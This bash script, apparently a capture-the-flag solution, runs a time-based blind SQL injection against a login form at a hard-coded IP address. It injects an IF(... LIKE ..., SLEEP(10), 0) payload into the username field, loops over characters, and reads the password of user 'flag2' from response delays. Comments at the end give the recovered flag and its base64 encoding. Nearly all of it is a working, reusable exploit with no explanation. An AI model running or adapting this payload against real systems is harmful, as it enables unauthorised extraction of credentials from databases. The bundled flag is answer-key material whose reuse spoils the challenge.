#!/bin/bash    
password="YXhhY"
passwordreel="YXhhY"
#cmd=$(curl 'http://54.254.115.115:5002/'  -H 'Connection: keep-alive'   -H 'Cache-Control: max-age=0'   -H 'Upgrade-Insecure-Requests: 1'   -H 'Origin: http://54.254.115.115:5002'   -H 'Content-Type: application/x-www-form-urlencoded'   -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36'   -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'   -H 'Referer: http://54.254.115.115:5002/'   -H 'Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'   --data 'username=flag2" and IF(password like "'"$password"'%",SLEEP(10),0) #'   --compressed   --insecure)


arrayName=('+' '/' 'a' 'b' 'c' 'd' 'e' '=' 'f' 'g' 'h' 'i' 'j' 'k' 'l' 'm' 'n' 'o' 'p' 'q' 'r' 's' 't' 'u' 'v' 'w' 'x' 'y' 'z' 'A' 'B' 'C' 'D' 'E' 'F' 'G' 'H' 'I' 'J' 'K' 'L' 'M' 'N' 'O' 'P' 'Q' 'R' 'S' 'T' 'U' 'V' 'W' 'X' 'Y' 'Z' '0' '1' '2' '3' '4' '5' '6' '7' '8' '9')
while true; do
a=0
for i in "${arrayName[@]}"; do
password="$passwordreel$i"
echo $password
SECONDS=0
heure1=$SECONDS
cmd=$(curl 'http://54.254.115.115:5002/'  -H 'Connection: keep-alive'   -H 'Cache-Control: max-age=0'   -H 'Upgrade-Insecure-Requests: 1'   -H 'Origin: http://54.254.115.115:5002'   -H 'Content-Type: application/x-www-form-urlencoded'   -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36'   -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'   -H 'Referer: http://54.254.115.115:5002/'   -H 'Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'   --data 'username=flag2" and IF(BINARY password like "'"$password"'%",SLEEP(10),0) #'   --compressed   --insecure)
heure2=$SECONDS
let diffH=$heure2-$heure1

echo "heure1:"$heure1
echo "heure2:"$heure2
echo "diffH:"$diffH

if [ $diffH -lt 5 ]; then
  a=$a+1;
  echo "nof Found !"
else
  passwordreel=$password
  echo "Found new char : "$password
  break
fi
done
echo $password

done
#axactf{t1m1ng_4tt4ck_4r3_fun_as_h3ll}
#YXhhY3Rme3QxbTFuZ180dHQ0Y2tfNHIzX2Z1bl9hc19oM2xsfQ==
#
